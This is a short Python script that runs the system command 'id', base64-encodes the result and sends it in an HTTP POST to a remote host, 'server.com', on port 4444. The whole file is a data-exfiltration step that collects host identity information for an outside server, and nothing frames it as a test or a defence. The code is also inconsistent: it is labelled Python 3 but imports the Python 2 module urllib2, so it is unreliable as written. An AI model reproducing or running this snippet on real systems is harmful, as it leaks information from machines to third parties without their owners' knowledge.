#  python3
import urllib2
import base64
import os

result = os.popen('id').readlines()
result = base64.b64encode(str(result))
url = "http://server.com:4444"
res = urllib2.Request(url, data=result)
resp = urllib2.urlopen(res)
print(resp)
